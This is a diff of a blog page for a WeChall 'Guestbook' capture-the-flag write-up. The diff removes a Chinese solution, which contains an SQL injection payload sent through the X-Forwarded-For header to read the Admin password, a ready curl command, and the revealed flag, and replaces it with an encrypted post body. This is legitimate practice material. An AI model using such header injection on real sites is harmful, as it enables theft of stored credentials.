@@ -22,17 +22,18 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Challenge 一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者 IP 写入数据库；目标是找到 Admin 的密码。 关键点不在留言内容，而在 IP 来源：程序信任 X-Forwarded-For，并把它当作字符串直接拼进 INSERT。 Solution 源码里的 IP 获取逻辑大致是：优先读取 $_SERVER[&#39;HTTP_X_FORWARDED_F">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - The Guestbook">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-the-guestbook/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Challenge 一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者 IP 写入数据库；目标是找到 Admin 的密码。 关键点不在留言内容，而在 IP 来源：程序信任 X-Forwarded-For，并把它当作字符串直接拼进 INSERT。 Solution 源码里的 IP 获取逻辑大致是：优先读取 $_SERVER[&#39;HTTP_X_FORWARDED_F">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-09T08:39:10.000Z">
-<meta property="article:modified_time" content="2026-09-09T02:47:51.446Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.176Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="sql-injection">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="wechall">
@@ -207,7 +208,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -220,7 +221,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -241,12 +241,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -361,33 +361,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
-<p>一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者
-IP 写入数据库；目标是找到 Admin 的密码。</p>
-<p>关键点不在留言内容，而在 IP 来源：程序信任
-<code>X-Forwarded-For</code>，并把它当作字符串直接拼进
-<code>INSERT</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>源码里的 IP 获取逻辑大致是：优先读取
-<code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，否则才使用真实远端地址。随后写入
-guestbook：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(<span class="string">&#x27;$sessid&#x27;</span>, <span class="number">0</span>, $<span class="type">time</span>, <span class="string">&#x27;$ip&#x27;</span>, <span class="string">&#x27;$message&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><code>$message</code> 会被正常处理，但 <code>$ip</code>
-没有转义。因为 <code>$ip</code> 被包在单引号里，可以用
-<code>X-Forwarded-For</code> 关闭当前字符串，再补齐后面的
-<code>VALUES</code> 字段。</p>
-<p>先构造一个不依赖盲注的 payload：把 Admin 密码查出来，直接写到
-guestbook 的 message 字段里。</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27;, (SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#</span><br></pre></td></tr></table></figure>
-<p>代入后 SQL 变成：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(</span><br><span class="line">  <span class="string">&#x27;$sessid&#x27;</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  $<span class="type">time</span>,</span><br><span class="line">  <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> gbu_password <span class="keyword">FROM</span> gbook_user <span class="keyword">WHERE</span> gbu_name<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>))#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;</span>$message<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
-<p><code>#</code> 注释掉原本剩下的
-<code>', '$message')</code>，于是子查询结果会作为留言内容落库。</p>
-<p>实际提交时需要带登录 cookie，并先从页面取当前 CSRF token：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&#x27;,(SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;message=test&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;sign=Sign Guestbook&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;gwf3_csrf=TOKEN&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/guestbook/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>再刷新 guestbook，刚插入的记录会显示 Admin 密码。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TheBrownFoxAndTheLazyDog</span></span>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="741ec33101ee4b6c49a4b5f27a9ae4f7adaab63e8488cefb6e8838c8c1756ead"
+     data-nonce="36cd8931d74bb90edb2d29b5"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    da336ce7425eae3b607c6b890fdc45548cab7c20e0ec819e7621abcd46d7629d283e9b8faf3b15c6afacaf7cdbca27b0a63fc164288a02484386cf92477d2daca69d5c1335501f3168de96b6480c1dd5112b5f1d2ca9057fc5e14657e6722a1b86f8854028c6ae1995e4889b2021c7ced970d20492f7b1bfca656f5d9b2bd09daf08f3cfbd8ed50b740c1e90124be7ea5dd3adb0ef02c256877def36b6b67ae2b37715882762b3ebfda4b3ab362f34c8f3b14b1a3fbad7b9c2f16814f2740f6c7f2120a77bd4f252933f655b77cbfec9d7ebe666db6c8adc03e91fdac702611741fa25b5d8745324560899d8a4f3c0886e168921a669981f81a4bca525e13b532b9ca75b9c1460067df809ee20681474d15b8d1b2761f71d4faf7d770cede08b5cce908eeeafcb40f938a01b57e04a33231739f0223272f2d7461cfa2db9f006d27881e450234f9fae113c18e17a10488e62a15d9055c59fce007a97619ee5b538bdee3f7a0ef5a51de4df90c40acf7609e807bce2fd47f638ffe85595495aeaa1618b436f6d57e0f51fef01f886f2be02c47e9f9df3ccea8131bfe792df3991c380289552cd32d02aedfd1d1c2a6f13604622d4964e2286fb83b5e4a9cb89a10cefa853e03e3bbb4f62ee09aae2e6a43a515ea1ac67496f18c26e399543408f14f902c6ed109a91b0a97c613ccae1f1f13f38afa0a2e0627e91c1b7ed0b6b29c5239f49de7db240ce2e691176faa67a5f2a0b5cabdcb48324cac72d8976c6aa5e5349c930bff9506931f532d094e6d60cccdf85c8b51bc0725755c5ceb1d4c61e95643d2cfe0cd2d1dd9ab2c14063505cf7eea94f9d0d682801de8d8a1b33903ac9262c0395d78108d9047b6eeee3f906b7c0b124b615dbda8be493f1172fe38ad65db37c9dfdb9774039cf0018a3a127e86cb84604b4de3f864d1ddb7f6ec4b41111ea4509d50827b20b5a69068a52bd353fe0c85e246bbe654f709d4ce5a71dc824019c908a292e3acdac25bb9b0835029365c1ea3013c65a41ec643b55be025b8dfc0fd98062932a438d07346519bc977ae03544a07e92ffa5c29ba7102c98f822b2183e65e628df0b049931c3ef0bbe535d509553f1a3bd2be71d7ff05f0760fe33e4aaf2fe7b73189333c497e006f3dd43f08b93ab033bfd14ad685bba7afd79b77ca24a36f29df4e1452547bed72771b2a4e9982ba54c5b9a2aa875ce70cf7791046a6f768443a71472711daf9d4935c73255ce46b6be5fd07593d6a1edabbf64cc024f9fd008b7f6239c493cb002856840d40b24ba8db50a8366703f2eaded6cc5aff45bfb269327eb244169f6389c028d70cb29ea2ba1387e62c9b19359a96cc3212ac234e1e1b1359d9dcf73aa52e5395c840a9bf841aff7a2338694ad2814c13c64a37f49afb82f4d807bdd69352e4bae6ba177824cb6996e600ef5da98ec0143957b0c62f59a54bdbe8ff5f807c4b2259dd4cec2b0e38be5e95e3cd5cca98e500bc04df3eeab76911a5b3768da62f6e961abddf98eb98c26be313237685196b918931609b21b68c984f989a7624ceb9e5dab261d067a83d703dfe60ee8c3b032d8d64b848e48ab0505eca535f39f1c8404c3d764f63a83360cc2416dfc5369755317e157425419bb6160d1f3d42953864ef73c2b9e9658a80cdf8df72e7a539ffd8fcb98d261153342f71dd7a8b9f8d6eaf3c4ab6e7325f64d1f91a438db5f818476158f605a3fb5362cd652f8a1ebfae0387021d02262fff3148914a48d2f21182784d4f2334da2f480e2ce2bf6f757119efc58d966c0da049bcaa4faeadf7408904020002cea862ec5ce55bc7b86ea7b6d87bf604c82f07e035712a5156e5e8979eb8d76a589d9f6044249e813c548511f155e5fa77615ece1f24e152cd797a3bb1d90917ead9a5a4534f5e82c1468855d2c4fd60571d251f6d5c02dea2e7a82985b5134f0275238775040d88d107b6b741128af0f5233b4d00fffb348825a97ba33f36258730d989700c613bc8279beded2b4b74c3aa422959ea3c988e8308c82fbc9eaf06dcd1697c4a28c68a3ac9671a1b1f10d43677d3375efec0442853d30ab063a8a5f3283201273b9740459dbc70a4381b0ab42647205d023e684939da89e661c0d1673e2f99d8381b36db5ea971897e92aac5764a7e8663dcdd8757fef78cee3dce01481932ccbdab390790e72bed973957451a7aace8ef84feb2989f3ef7952ecac47a05ff785769cf829ab288cba688653e2627238f1bfd9682633cde85cfa33d0864c94a52f74a70ebc0649ab2428d5a0c9566edd0b8c9351ce3b3d8f000ead97accd0f084000852e68b08d7ecd78d5ab09de96380d502d43f502196cef45eab1358a79572ca2425987f5320083a24822a41d5c15d16e5ec7366c4ea5010ec34d0026e1b6153b80eac8d466612bd94852d03e3278c0e33f7f6e34594c58a2305acf434870662b68831baec9b69baf334838fbf8d8931f510c1ab4d8d76e8da018df9fdcadf50a91059413e68692ce87929c1b00e550f6589ca6a0128879a90d18d43897c3b4b3aff83b8863d874588d3b7ba771d57b7a035628bafe543f8bc19cdabc72022f9dccd7160dfc96cbf53ce28c003ba0a2908b7a363021fce0cfd77136977e646b450a2a0208eb19d4695bef3486a4498d1ffdfed237ce16960d2c39c46afdc5c1bbb0b4b53948016b2ffc738cd88f67a5df8ba5c52ed31ba5786dde040e228d649270b7696047b0c217688f7f724421609da120c9351a06827cefdaa8df770dc95e9935c5418c70d35ce99a618f94673f048fa41fdb20ef8263aa33e579a9b21bc87a2981a8b1850fc31d17fc87ca4ca95f0ca9eae8c6bfc735eafa02ba7daee0a4178251d01fd50d1b71c8bf27812397b3f0e7d92425d71a9804bce1d6f265a188b9557e7dc29a2e1245b265021801d93cc5e42d120c573dec175b1bec42a60115c90a53cebadf2aa03310a87e942bbfaf331056aa37d81e184599fd794175a52b38d4f0100c9ac209449e5af615beba1cf21f17e5b7435f8a31a5a93c3490c723ccede50abe2c17efabd4d2e5d2aecca4ea5741a1fa27d4dc846ab07155ae4481333999614a21f8ba577e3a7b3dbdbfd134aa8983c91f481370cd0d699388878c32c777fdea7ae2c9c57c19901821514583ebb27f39f9270580a5264af50bc8987c3e4fe225b626657d1cdc9da954763da4002d0996f67ba619c4021a480cb564de097023f5ff0ba86a43cf90e5dc3c340eaa82947e9b57e5c9c8aff289067fadeb91f7007278d182bae868ff10eabe6b839215be98dff9edfc7777a0809dcfd0eb753c69a248eff996b4e85b045b4f41d4de37a356e875c7c69c8df5367149f3dc2d696d07a42dadefae45793f1bcb16eb6a3410b128f577b91073b1f28c74902c9ab05776e5014af8e4a4a1642dcb32fb63675c4aac79a7b1b487722b6ff84ce70711ba0bf6d9bf7c9016a0475061d4cf881b206426b84e14d9e2fe1c588ec7532cd4c5454ca94ed14e85794f0b7e4a859fba25a1321e4aa75c468783505f04d6b52e6de15dacc51b34265b0b6ff0cc02c5d9d178fb9c150777f3372cd989256abfd3834e3dd5f08590cd7c0b5b392b424326777de6d8213c838708ba9e9fc68d7b7153fd4539b5de2e6f1f98f612ef2155997a3cb92de80d62580ee47631237ef44681e441d7c86b66cb0b00fa58634ebaf4ab3944e777cc4d90678d716ebe245600363556eef60cd0d176288f31eed13d36b3994ffae68e9aff4481241505ec61baa00a382f6cfdd9a8782a18bf4a3cf27d24db04cd37e5a9af8e85be49c39d7df9d93083778b34206220a704dd55fc933fbf888355ca555cc1b8665c301a3324ebf30a768e7149e164b84d5a2c7ac673351a54110c5bd4cc67ec52302f7337075aa86ce28ffd7f73d77d487ac4b699b5974b65cdad6f159bdb90526c4cafc87177103a552cce89b509c701e59ab69b99f4515371e212ab86471ebb07971bead758ddd9f8b46eb32e87b75aa8d2010c4bcd3c9100a7f0740f9a2e729443baa8f69006e5f7cf27752d002e61a60df70ea9f02d24acaaf11a97a54e626f154f300058d3e1f363d0abb598dbb6bdc61c28819c6a531e28d5ee1b1312a5a8d011cfc286b40cd06e56210328fa418e2fef4c2e7c299d7277c7635056bca008f371281a1037a414862c7b515e248da66ca93424d50b815296c528407796a3ba695ec223bb09bc876585c88bfb957e5b3a97ba7b003f9d5a82d10396104399eabe4116b806f8b579307927dee3d58a8042c630adc7bb8acf9d12febaa776665121c70e5b6a4bd5cd2779fbbcba48cab9984176e37f8b85a159224ebf64d5e0d25d7bfa1d6bed892f5421a6a5f85134377bcf74ec270442a5b88c93bcd46a8ec7282a76e37faecf93bf8c3c7f0d7603ea1f5d917e01abc9874c5c8e76addb5fd5969587a6759f29800e458af04b0323701c8712f1b1374f6d6cfc9415ffa6bc5887888305304ff47c0d3946d0360671d5d43884a3f1899a3cacd421a6b0bcc85fad0633b33fd31448e0cc178798ef50bca5b1bda0c3db180be7dbe4fdf162586dae5955fff58abe8580a22b580a8b1706e0449c971604df587942f799c7e719571d7ec84b1221c26c882e8e9251829b4947256c68db283647854565ab6c081732e460bcda761eec1095b9d449dfa6f2b853058a6596bfdbcbc0e7d29b0239db84748d528522fa9fb6f72818519a2299f8eca01a8b2b3619fe76bd8289c448bf37a836c11c24d2b705864966a8656e432e1fb88591319609639602565a38f2960222e82fcf573beb7aed3b060b13c16e29a07214889a98aca25898e8dd63f39619240914820957367fc3db89357e35b2e0c2c3b3ef91648edf69b8bd9de9bb2d2e0ebd87aa4528a0b0f41c73de45aabb881cb2f5775b8a1176dae7e9989524fe31c8e687723c6ff36519e95c53a647ecfee048f65996e5e34e6f5a4fc59515e60b5d1ecbfd48f72f026ebd5557a8de5d536e302d859b81e515f92d46fc27c7cbbd098a5c17cf8d11497793f6ce98df5bc7f20de924399ac58d5d1164e3d28d9d0ebe03280ab060b5a70f09c9e114b0a46300f77fb6a7e262c45ff0bd7a130c373ee14316684fb3ea8d195cfd3648841567c640307f6020478920a44a1c9cf3f8722b6502a781705f0f395fcb7688f1e10d0fbfcc980ea4a34c51a5865bc9acb0c9da7f979846bb4311b3c5cae8d244675cab5cb664085e39289b38e481d830a17aa8d00f9744a03e9291ac2c120635795a7fdfffbb9b0d2c63b0dab1646c898c8c9c522184959b116704e0442d927853d5f1ea6500df603c1ec1d3b1ff199466945c490d25fd456fe2c8b1a51dc076dec51081c23a915cb269cd2c9309c2d59cbcb0a92d10f70ffe47dca871a5b5ad6ac20d89142d322bcc3415fc226c496eba09a9fe3309bad6ace5054f5a263077cccb9e190204025290a622462cbdecacb30180dea0a9108bdc07b5ba21ada6de94a6f2fff17e9f0d21cbf34b7c5e0b738bf5ffbd946029d0a0905e11ab70ba6adf45548701fe6d28cad41e80ca11e29596c1b420423373055f44c60645316868e0229de197d4f1137df4499ce66bf9d6c424c6555c5643a620aa68d2d622bd93c88e9943a424fe5ccd29557f07de04e91c61037a6a1790b6cf8ddfa370a0b10bee534e8ceb244115f8b8b914f51038b8e241a5dd0749f17510fda4ecedd42940e9c22055a04a51219e3d1780387708845e5aa2503f7adecd475935c95863fa2f1c2cfd886639a1f220c26c90e3f1ea8ec6970bb612ccaec3f943b490e17200dbfe97154fd8d0e8e84a768ddc68e571b6436ad393814ea26f542c4cf82a5aee5174da2fb7567780509b65b3bb34484586bed8f909bb749e50d86a1adb13ee964472da2fd467e156b421ad61439d28e0ba378830ef4e3f82afed5b7d49bafa7da3233ac0262dbc32ff8fbc02a06d7385c59209cacca8aadbd8dae75bdde5ceda2f849ac80512d73d01abe8c7461c0db2a152df72e06ec21d847bc0edf70db4f6447bcef1b852f129bab6df2d231051855004b6e7938270477b1d058bd60c961cc9fe8c5f32432cd6d7980a99689b68e009cc1bc6eeaad37c96c69f255d40
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -434,6 +432,7 @@ guestbook 的 message 字段里。</p>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
               <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
               <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql-injection</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
               <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
           </div>
 
